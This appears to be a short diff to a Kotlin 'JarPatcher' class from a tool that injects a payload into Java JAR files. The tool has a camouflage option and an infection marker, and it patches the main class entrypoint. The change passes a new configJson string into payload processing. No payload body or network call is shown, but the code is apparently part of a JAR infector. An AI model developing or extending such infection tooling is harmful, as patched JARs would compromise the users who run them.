@@ -21,7 +21,8 @@ class JarPatcher(
     private val inputPath: Path,
     private val outputPath: Path,
     private val camouflage: Boolean,
-    private val config: Config
+    private val config: Config,
+    private val configJson: String
 ) {
     private val infectionMarker = InfectionMarker()
     private val jarAnalyzer = JarAnalyzer()
@@ -56,7 +57,14 @@ class JarPatcher(
 
             Logs.info("[STEP 2] Processing payload...")
             val rawPayload = payloadLoader.loadDefault()
-            val processedPayload = payloadProcessor.process(rawPayload, camouflage, tempJarPath.toFile(), dominantVersion, config)
+            val processedPayload = payloadProcessor.process(
+                rawPayload,
+                camouflage,
+                tempJarPath.toFile(),
+                dominantVersion,
+                config,
+                configJson
+            )
 
             Logs.info("[STEP 3] Patching main class entrypoint...")
             val modifiedMainClassBytes = mainClassPatcher.patch(
